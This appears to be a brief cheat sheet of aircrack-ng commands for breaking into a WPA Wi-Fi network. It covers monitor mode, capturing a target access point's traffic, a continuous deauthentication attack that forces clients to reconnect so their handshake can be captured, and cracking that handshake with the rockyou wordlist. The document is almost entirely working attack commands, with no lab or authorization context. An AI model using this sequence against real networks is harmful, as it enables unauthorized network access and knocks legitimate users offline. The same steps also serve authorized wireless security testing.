Put card in monitor mode:
---
#monitor-mode
```bash
airmon-ng start wlan0
```
```bash
ifconfig wlan0 down #
iwconfig wlan0 mode monitor
ifconfig wlan0 up
airmon-ng check
airmon-ng check kill
airodump-ng wlan0mon
```
```bash
airodump-ng -c $WIFI_CHANNEL –bssid $BSSID_MAC -w $CAP_FILE wlan0mon
```
de-auth to force handshake:
```bash
sudo aireplay-ng –deauth 0 -a $BSSID_MAC -c $CLIENT_MAC wlan0mon
```
crack the handshake with wordlist:
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt $CAP_FILE
```